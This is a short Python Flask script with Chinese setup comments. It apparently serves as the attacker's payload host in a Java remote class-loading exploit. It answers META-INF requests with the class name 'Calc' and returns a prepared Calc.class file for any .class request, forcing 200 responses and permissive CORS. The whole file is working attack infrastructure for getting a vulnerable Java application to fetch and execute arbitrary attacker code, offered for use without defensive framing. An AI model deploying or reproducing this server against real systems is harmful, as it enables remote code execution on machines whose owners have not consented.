"""
pip3 install flask-cors flask
python3 app.py 监听的端口
Author： Andey
将准备好的Calc.class放在app.py同一目录下。
"""
from flask import Flask,request, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True)


@app.after_request
def add_header(response):
    response.status_code = 200
    response.headers['Content-Type'] = 'application/javascript'
    return response


@app.before_request
def before_request():
    if "META-INF" in request.path:
        print ("send payload1 ==> " )
        return "Calc"
    if ".class" in request.path:
        print ("send payload2 ==> " )
        return send_file('Calc.class')

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1])
    app.run(host='0.0.0.0', port=port)
